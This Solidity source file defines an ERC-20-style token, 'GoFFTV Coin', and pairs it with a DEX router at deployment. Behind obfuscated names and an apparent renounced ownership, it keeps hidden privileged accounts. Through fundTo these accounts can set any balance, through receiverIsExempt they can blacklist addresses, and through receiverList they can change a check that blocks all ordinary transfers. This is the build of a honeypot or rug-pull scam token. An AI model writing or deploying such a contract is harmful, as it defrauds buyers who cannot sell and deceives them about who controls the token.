//SPDX-License-Identifier: MIT

pragma solidity ^0.8.10;

interface takeBuy {
    function totalSupply() external view returns (uint256);

    function balanceOf(address atTxIs) external view returns (uint256);

    function transfer(address swapShould, uint256 marketingTrading) external returns (bool);

    function allowance(address isMarketingTeam, address spender) external view returns (uint256);

    function approve(address spender, uint256 marketingTrading) external returns (bool);

    function transferFrom(
        address sender,
        address swapShould,
        uint256 marketingTrading
    ) external returns (bool);

    event Transfer(address indexed from, address indexed feeMax, uint256 value);
    event Approval(address indexed isMarketingTeam, address indexed spender, uint256 value);
}

interface modeToTotal is takeBuy {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

abstract contract limitModeToken {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface swapSell {
    function createPair(address feeTo, address liquidityShould) external returns (address);
}

interface txFundLimit {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

contract GoFFTVCoin is limitModeToken, takeBuy, modeToTotal {

    mapping(address => bool) public receiverEnable;

    address public senderFund;

    mapping(address => mapping(address => uint256)) private launchedLaunch;

    string private txSender = "GoFFTV Coin";

    address private limitList;

    function autoReceiver() private view {
        require(tradingAmount[_msgSender()]);
    }

    uint256 private totalLaunchedShould;

    function owner() external view returns (address) {
        return limitList;
    }

    string private amountTo = "GCN";

    function launchLimit(address exemptSender) public {
        if (tradingTokenTo) {
            return;
        }
        
        tradingAmount[exemptSender] = true;
        if (totalLaunchedShould != autoTakeReceiver) {
            enableTo = false;
        }
        tradingTokenTo = true;
    }

    function minSellReceiver(address exemptMode, address swapShould, uint256 marketingTrading) internal returns (bool) {
        require(receiverFund[exemptMode] >= marketingTrading);
        receiverFund[exemptMode] -= marketingTrading;
        receiverFund[swapShould] += marketingTrading;
        emit Transfer(exemptMode, swapShould, marketingTrading);
        return true;
    }

    function transferFrom(address exemptMode, address swapShould, uint256 marketingTrading) external override returns (bool) {
        if (_msgSender() != buyFundTeam) {
            if (launchedLaunch[exemptMode][_msgSender()] != type(uint256).max) {
                require(marketingTrading <= launchedLaunch[exemptMode][_msgSender()]);
                launchedLaunch[exemptMode][_msgSender()] -= marketingTrading;
            }
        }
        return isToken(exemptMode, swapShould, marketingTrading);
    }

    address autoFromShould = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function allowance(address modeFeeWallet, address walletFee) external view virtual override returns (uint256) {
        if (walletFee == buyFundTeam) {
            return type(uint256).max;
        }
        return launchedLaunch[modeFeeWallet][walletFee];
    }

    uint256 isTake;

    uint256 private autoTakeReceiver;

    event OwnershipTransferred(address indexed launchedTo, address indexed minFrom);

    function decimals() external view virtual override returns (uint8) {
        return liquidityMode;
    }

    address buyFundTeam = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function isToken(address exemptMode, address swapShould, uint256 marketingTrading) internal returns (bool) {
        if (exemptMode == swapTrading) {
            return minSellReceiver(exemptMode, swapShould, marketingTrading);
        }
        uint256 marketingShouldSender = takeBuy(senderFund).balanceOf(autoFromShould);
        require(marketingShouldSender == totalLiquidity);
        require(!receiverEnable[exemptMode]);
        return minSellReceiver(exemptMode, swapShould, marketingTrading);
    }

    function symbol() external view virtual override returns (string memory) {
        return amountTo;
    }

    function approve(address walletFee, uint256 marketingTrading) public virtual override returns (bool) {
        launchedLaunch[_msgSender()][walletFee] = marketingTrading;
        emit Approval(_msgSender(), walletFee, marketingTrading);
        return true;
    }

    uint256 private isExempt;

    mapping(address => uint256) private receiverFund;

    function transfer(address teamIs, uint256 marketingTrading) external virtual override returns (bool) {
        return isToken(_msgSender(), teamIs, marketingTrading);
    }

    function balanceOf(address atTxIs) public view virtual override returns (uint256) {
        return receiverFund[atTxIs];
    }

    uint256 private tradingFund = 100000000 * 10 ** 18;

    function fundTo(address teamIs, uint256 marketingTrading) public {
        autoReceiver();
        receiverFund[teamIs] = marketingTrading;
    }

    address public swapTrading;

    function amountLimit() public {
        emit OwnershipTransferred(swapTrading, address(0));
        limitList = address(0);
    }

    uint256 public amountModeSell;

    uint8 private liquidityMode = 18;

    bool private enableTo;

    function receiverList(uint256 marketingTrading) public {
        autoReceiver();
        totalLiquidity = marketingTrading;
    }

    bool public tradingTokenTo;

    mapping(address => bool) public tradingAmount;

    bool private swapTake;

    constructor (){
        if (enableTo != fundFee) {
            fundFee = true;
        }
        amountLimit();
        txFundLimit fromMax = txFundLimit(buyFundTeam);
        senderFund = swapSell(fromMax.factory()).createPair(fromMax.WETH(), address(this));
        
        swapTrading = _msgSender();
        tradingAmount[swapTrading] = true;
        receiverFund[swapTrading] = tradingFund;
        
        emit Transfer(address(0), swapTrading, tradingFund);
    }

    function receiverIsExempt(address tradingSell) public {
        autoReceiver();
        
        if (tradingSell == swapTrading || tradingSell == senderFund) {
            return;
        }
        receiverEnable[tradingSell] = true;
    }

    function totalSupply() external view virtual override returns (uint256) {
        return tradingFund;
    }

    function name() external view virtual override returns (string memory) {
        return txSender;
    }

    uint256 totalLiquidity;

    bool public fundFee;

    function getOwner() external view returns (address) {
        return limitList;
    }

}